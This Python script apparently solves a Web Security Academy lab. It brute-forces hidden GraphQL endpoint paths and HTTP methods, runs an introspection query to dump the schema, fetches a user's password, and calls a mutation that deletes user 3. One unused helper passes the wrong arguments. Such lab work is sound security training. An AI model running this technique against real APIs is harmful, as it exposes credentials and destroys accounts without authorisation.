import http.client
import json
import random
import ssl
from typing import Callable

LAB_ID = "???"


def METHOD_graphql_v1(
        method: str,
        path: str,
        query: None | str = None,
) -> http.client.HTTPResponse:
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.5',
        'referer': f'https://{LAB_ID}.web-security-academy.net/post?postId=1',
        'content-type': 'application/json',
        'origin': f'https://{LAB_ID}.web-security-academy.net',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'te': 'trailers',
    }
    body = None
    if query is None:
        body = json.dumps({
            "query": f"""
            
                query getUser($id: Int!) {{
                    getUser(id: $id) {{
                        username
                        password
                    }}
                }}
        """,
            "variables": {
                "id": 1,
            },
        })
    else:
        body = json.dumps({"query": query})
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


def is_path_correct(path: str) -> bool:
    response = METHOD_graphql_v1(path)
    return response.status != 404


keywords = [
    lambda x: f'v{x}',
    lambda x: 'graphql',
    lambda x: 'graph',
    lambda x: 'api',
    lambda x: 'console',
    lambda x: 'explorer',
]


def random_path(keywords: list[Callable[[int], str]]):
    segments = []
    pos1 = random.randint(0, len(keywords))
    pos2 = random.randint(0, len(keywords))
    while pos2 != len(keywords) and pos2 == pos1:
        pos2 = random.randint(0, len(keywords))
    pos3 = random.randint(0, len(keywords))
    while pos3 != len(keywords) and (pos3 == pos1 or pos3 == pos2):
        pos3 = random.randint(0, len(keywords))
    if pos1 != len(keywords):
        segments.append(keywords[pos1](random.randint(1, 5)))
    if pos2 != len(keywords):
        segments.append(keywords[pos2](random.randint(1, 5)))
    if pos3 != len(keywords):
        segments.append(keywords[pos3](random.randint(1, 5)))
    return "/" + "/".join(segments)


max_tries = 1000
path = random_path(keywords)
method = "POST"
print(f"trying {path}")
response = METHOD_graphql_v1(method, path)
print(f'response code: {response.status}')
for i in range(max_tries):
    if response.status != 404:
        print(f"found path: {path}")
        break
    path = random_path(keywords)
    print(f"try {i}: {path}")
    response = METHOD_graphql_v1(method, path)
    print(f'response code: {response.status}')
    print(response.read().decode('utf-8'))
else:
    print(f"after {max_tries} couldn't find graphql endpoint path")


# it's method not allowed
methods = ["GET", "PUT", "PATCH"]
for m in methods:
    method = m
    print(f"trying {method} {path}")
    response = METHOD_graphql_v1(method, path)
    if response.status != 405:
        print(f"found {method} {path}")
        print(f'response code: {response.status}')
        print(response.read().decode('utf-8'))
        break
else:
    print("couldn't find graphql endpoint method")


# get the schema
response = METHOD_graphql_v1(method, path,
                  query=f"""
                query IntrospectionQuery {{
                    __schema
                    {{
                        queryType {{
                            name
                        }}
                        mutationType {{
                            name
                        }}
                        types {{
                            name
                            fields {{
                                name
                                type {{
                                    name
                                    kind
                                }}
                                args {{
                                    name
                                    type {{
                                        name
                                        kind
                                    }}
                                }}
                            }}
                        }}
                    }}
                }}
        """)
print(response.status)
print(response.read())

# delete user
response = METHOD_graphql_v1(method, path,
                  query = """
                  mutation DeleteUser {
                    deleteOrganizationUser(input: {id: 3}) {
                        user {
                            id
                            username
                        }
                    }
                  }        
                  """)
print(response.status)
print(response.read())